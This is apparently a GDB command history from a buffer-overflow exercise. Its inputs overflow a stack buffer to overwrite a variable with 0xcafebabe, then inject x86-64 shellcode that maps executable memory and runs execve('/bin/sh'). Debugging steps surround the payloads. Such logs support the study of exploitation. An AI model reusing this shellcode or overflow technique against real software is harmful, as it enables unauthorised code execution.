disass func
b *func+48
r <<< $(python -c 'print "AAAA"')
x/30x $ebp-0x2c
p $ebp
x $ebp
r <<< $(python -c 'print "A"*(0x2c+4)+"\xbe\xba\xfe\xca"')
x $ebp
x/30x $ebp-0x2c
r <<< $(python -c 'print "A"*(0x2c+4+4)+"\xbe\xba\xfe\xca"')
r <<< $(python -c 'print "A"*(0x2c+4+4)+"\xbe\xba\xfe\xca"')
x/30x $ebp-0x2c
c
quit
disass main
b *main+100
r <<< $(python -c 'print "A"*0x30+"\x48\xC7\xC7\x00\x00\x03\x00\x48\xC7\xC6\x00\x20\x00\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x22\x00\x00\x00\x49\xFF\xC8\x49\xC7\xC1\x00\x00\x00\x00\xB0\x09\x0F\x05\x48\xC7\xC4\x00\x10\x03\x00\x48\x31\xC0\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05"')
b *main+141
c
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
r <<< $(python -c "print 'A'*0x30+'\x48\xC7\xC7\x00\x00\x03\x00\x48\xC7\xC6\x00\x20\x00\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x22\x00\x00\x00\x49\xFF\xC8\x49\xC7\xC1\x00\x00\x00\x00\xB0\x09\x0F\x05\x48\xC7\xC4\x00\x10\x03\x00\x48\x31\xC0\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05'")
c
si
si
si
si
si
si
si
si
si
si
si
si
si
si
r < out.txt 
c
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
next
r < out.txt 
c
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
next
si
si
si
si
si
si
